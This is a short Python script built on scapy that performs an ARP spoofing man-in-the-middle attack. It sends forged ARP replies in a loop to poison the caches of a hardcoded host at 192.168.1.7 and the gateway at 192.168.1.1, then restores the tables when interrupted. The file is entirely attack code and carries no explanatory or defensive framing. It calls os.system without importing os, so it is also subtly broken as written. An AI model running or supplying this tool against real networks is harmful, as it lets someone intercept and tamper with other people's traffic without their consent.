import scapy.all as scapy
import re
import optparse
import time
import sys

def get_mac(ip):
	arp_request=scapy.ARP(pdst=ip)
	ether_packet=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	packet=ether_packet/arp_request
	answered,unanswered=scapy.srp(packet,timeout=1,verbose=False)

	for device in answered:
		return(device[1].hwsrc)

	


def spoof(ip,spoof_ip):
	arp_response=scapy.ARP(op=2,pdst=ip,hwdst=get_mac(ip),psrc=spoof_ip)
	scapy.send(arp_response,verbose=False)



def restore_tables(ip,unspoof_ip):
	arp_response=scapy.ARP(op=2,pdst=ip,hwdst=get_mac(ip),psrc=unspoof_ip,hwsrc=get_mac(unspoof_ip))
	scapy.send(arp_response,count=4)

def arp_spoof():
	count=0
	os.system('clear')
	print( '\t\t\t\t  <<<ARP SPOOF IN PROGRESS>>>> ')
	while True:
		try:
			spoof('192.168.1.7','192.168.1.1')
			spoof('192.168.1.1','192.168.1.7')
			count+=2
			print("\r[+]  Sent ",count," packets"),
			sys.stdout.write('\x1b[1A')
			sys.stdout.write('\x1b[2K')
			time.sleep(2)
		except KeyboardInterrupt:
			print('Restoring ARP Tables')
			time.sleep(1)
			restore_tables('192.168.1.7','192.168.1.1')
			restore_tables('192.168.1.1','192.168.1.7')
			os.system('clear')
			break
	
arp_spoof()
